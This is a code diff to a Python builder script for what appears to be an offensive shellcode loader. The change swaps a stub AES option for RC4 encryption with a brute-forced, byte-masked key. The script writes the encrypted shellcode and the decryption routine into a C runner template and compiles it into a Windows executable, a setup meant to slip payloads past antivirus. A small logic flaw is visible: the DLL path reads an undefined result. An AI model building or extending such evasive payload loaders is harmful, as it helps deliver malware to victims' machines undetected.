@@ -3,6 +3,7 @@ import argparse
 import subprocess
 import os
 from itertools import cycle
+from RC4Encryption import RC4Encryption
 
 print("""
 .▄▄ ·   ▄ .▄ ▄▄▄        ▄• ▄▌ ·▄▄▄▄  
@@ -69,16 +70,17 @@ def readShellcode(filePath):
 # Compile to binary
 def compile():
 	if args.output.endswith(".exe"): # PE compilation
-		p = subprocess.run([f"x86_64-w64-mingw32-gcc -I/usr/share/mingw-w64/include ./src/* -o ./output/{args.output}"], shell=True, capture_output=True)
-		if "returned 1 exit status" in p.stderr.decode():
-			print("[-] Compilation failed.")
-			exit()
-		else:
-			print("[+] Compilation successful. Check output folder.")
-			exit()
+		p = subprocess.run([f"x86_64-w64-mingw32-gcc -I/usr/share/mingw-w64/include ./build/standard/* -o ./output/{args.output}"], shell=True, capture_output=True)
 
 	if args.output.endswith(".dll"): # DLL compilation (TO-DO)
 		print("WIP1")
+
+	if "returned 1 exit status" in p.stderr.decode():
+			print("[-] Compilation failed.")
+			exit()
+	else:
+		print("[+] Compilation successful. Check output folder.")
+		exit()
 
 	return
 
@@ -86,17 +88,16 @@ def compile():
 def writePayload(shellcode, blob):
 
 	## Read in runner template lines
-	mainFileR = open("./setup/template.c", "r")
+	mainFileR = open("./build/template.c", "r")
 	mainLines = mainFileR.readlines()
 	mainFileR.close()
-
 	
 	## Loop over lines and update payload / size
 	newLines = []
 	for line in mainLines:
 
-		# Update payload line
-		if "BYTE pPayload[]" in line and args.xor: ## XOR
+		### Update payload line
+		if "BYTE pPayload[]" in line and not args.delta: ## XOR
 			line = "\tBYTE pPayload[] = { "
 			for j in range(0,len(shellcode)):
 				if j != len(shellcode)-1:
@@ -106,16 +107,8 @@ def writePayload(shellcode, blob):
 
 		elif "BYTE pPayload[]" in line and args.delta: ## Delta Encoding
 			line = "\n"
-
-		elif "BYTE pPayload[]" in line: ## Default - AES 
-			line = "\tBYTE pPayload[] = { "
-			for j in range(0,len(shellcode)):
-				if j != len(shellcode)-1:
-					line += f"0x{shellcode[j].hex()}, "
-				else:
-					line += f"0x{shellcode[j].hex()}" + " };\n"
 		
-		# Update size line
+		### Update size line
 		if "SIZE_T sPayloadSize" in line:
 			line = f"\tSIZE_T sPayloadSize = {len(shellcode)};\n"
 
@@ -123,11 +116,13 @@ def writePayload(shellcode, blob):
 
 	## Update decryption protocol
 	for i in range(0,len(newLines)):
+
+		### Add in decryption blob
 		if "SIZE_T sPayloadSize" in newLines[i]:
 			newLines[i+1:i+1] = blob
 
 	# Write to runner
-	with open("./src/main.c", mode="wt", encoding="utf-8") as mainFileW:
+	with open("./build/standard/main.c", mode="wt", encoding="utf-8") as mainFileW:
 		for line in newLines:
 			mainFileW.write(line)
 	
@@ -212,17 +207,35 @@ def xorBlob(key):
 	"""
 	return blob
 
-# AES encryption
-def encryptAES(shellcode):
-	print("Encrypt me!")
-	key = 1
-	iv = 1
-	return shellcode, key, iv
+def encryptRC4(shellcode):
 
-# AES decryption blob
-def aesBlob(key, iv):
-	print("AES BLOB!!")
-	blob = "HASDFASDF!!"
+	key = os.urandom(32) # RC4 KEY LENGTH!
+	firstbyte = key[0]
+
+	rc4 = RC4Encryption(key)
+	rc4.make_key()
+	encrypted = rc4.encrypt(b''.join(shellcode))
+
+	# XOR'ing RC4 key
+	brutekey = os.urandom(1)
+	encKey = bytes(a ^ b for a, b in zip(key, cycle(brutekey)))
+
+	return encrypted, encKey, firstbyte
+
+def rc4Blob(encKey, firstbyte):
+
+	# Paste key and firstbyte
+	blob = f"\tBYTE bFirstByte = 0x{firstbyte.to_bytes(1,byteorder='big').hex()};\n"
+	blob += "\tPBYTE pKey = NULL;\n"
+	blob += "\tBYTE pEncKey[] = { "
+	for i in range(0,len(encKey)):
+		if i != len(encKey)-1:
+			blob += f"0x{encKey[i].to_bytes(1,byteorder='big').hex()}, "
+		else:
+			blob += f"0x{encKey[i].to_bytes(1,byteorder='big').hex()} " + "};\n"
+	blob += "\tBruteDecryption(bFirstByte, pEncKey, sizeof(pEncKey), &pKey);\n"
+	blob += "Rc4EncryptionViSystemFunc032(pKey, pPayload, sizeof(pEncKey), sPayloadSize);\n"
+
 	return blob
 
 def main():
@@ -247,8 +260,8 @@ def main():
 	elif args.dont_encrypt: # DON'T ENCRYPT
 		writePayload(shellcode, None)
 	else: # DEFAULT - AES-256
-		shellcode, key, iv = encryptAES(shellcode)
-		writePayload(shellcode, aesBlob(key,iv))
+		shellcode, encKey, firstbyte = encryptRC4(shellcode)
+		writePayload(shellcode, rc4Blob(encKey,firstbyte))
 
 	#### Compile
 	print("[~] Compiling...")
